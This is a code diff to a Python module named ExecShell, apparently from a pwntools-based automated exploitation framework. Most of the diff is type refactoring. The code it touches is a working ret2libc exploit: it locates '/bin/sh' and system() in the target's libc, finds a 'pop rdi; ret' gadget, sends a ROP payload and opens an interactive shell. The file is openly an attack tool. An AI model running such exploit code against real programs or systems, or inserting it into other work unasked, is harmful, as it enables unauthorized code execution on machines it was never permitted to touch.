@@ -1,19 +1,22 @@
+import typing
+from typing import Optional
+
 from abstract.module import AbstractModule
-from core.target import Target
+from core.targetbase import TargetBase
 from pwn import p64
 from loguru import logger
 
 
 class ExecShell(AbstractModule):
     @classmethod
-    def execute(cls, target: Target, *args, **kwargs) -> bool:
+    def execute(cls, target: TargetBase, handler: typing.Callable = None, *args, **kwargs) -> Optional:
         logger.info(f"Running {cls.__name__} module")
         logger.info("Looking for /bin/sh in the executable")
         bin_sh_string = b'/bin/sh\0'
         bin_sh_ptr = next(target.libc.search(bin_sh_string), None)
         if bin_sh_ptr is None:
             logger.critical(f"Failed to find /bin/sh in libc")
-            return False
+            return None
 
         system_ptr = target.libc.symbols["system"]
         pop_rdi = target.rop.find_gadget(['pop rdi', 'ret']).address
@@ -30,3 +33,4 @@ class ExecShell(AbstractModule):
         target.run_main(payload)
         logger.success(f"Switching to interactive mode")
         target.process.interactive()
+        return True
